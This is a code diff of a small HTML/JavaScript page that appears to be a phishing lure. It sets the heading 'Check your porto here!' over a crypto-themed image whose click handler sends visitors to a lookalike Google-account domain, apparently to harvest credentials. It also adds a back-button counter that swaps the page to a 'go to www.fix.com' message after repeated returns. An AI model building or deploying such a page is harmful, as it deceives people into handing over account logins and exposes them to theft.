@@ -79,16 +79,16 @@ if (location.hash === '#x') {
   function renderMain() {
     document.body.innerHTML = `
       <center>
-        <br><h3>Click this button and return to the page</h3><br><br>
+        <br><h3>Check your porto here!</h3><br><br>
         <img width=400
-             src="https://cdn.prod.website-files.com/5c2a9a234fdbba7439c48fa4/632cc665abbc286ce8f3e896_Screen%20Shot%202022-09-22%20at%204.11.09%20PM.webp"
+             src="https://kripto.ajaib.co.id/wp-content/uploads/2022/11/ezgif.com-gif-maker-2022-11-22T093514.964-1024x575.webp"
              style="cursor:pointer"
              onclick="location='https://account.google.com.pwr.wtf/public_html/slaw.html'">
       </center>
     `;
   }
 
-  function renderError() {
+  function renderChanged() {
     document.body.innerHTML = `
       <center>
         <br><h3>error? go to www.fix.com</h3>
@@ -96,14 +96,22 @@ if (location.hash === '#x') {
     `;
   }
 
-  renderMain();
+  let backCount = sessionStorage.getItem("backCount") || 0;
 
-  // Detect when user returns via back button
   window.addEventListener("pageshow", function(e) {
     if (performance.navigation.type === 2 || e.persisted) {
-      renderError();
+      backCount++;
+      sessionStorage.setItem("backCount", backCount);
+
+      if (backCount >= 3) {
+        renderChanged();
+        return;
+      }
     }
   });
+
+  renderMain();
 }
 </script>
+
 
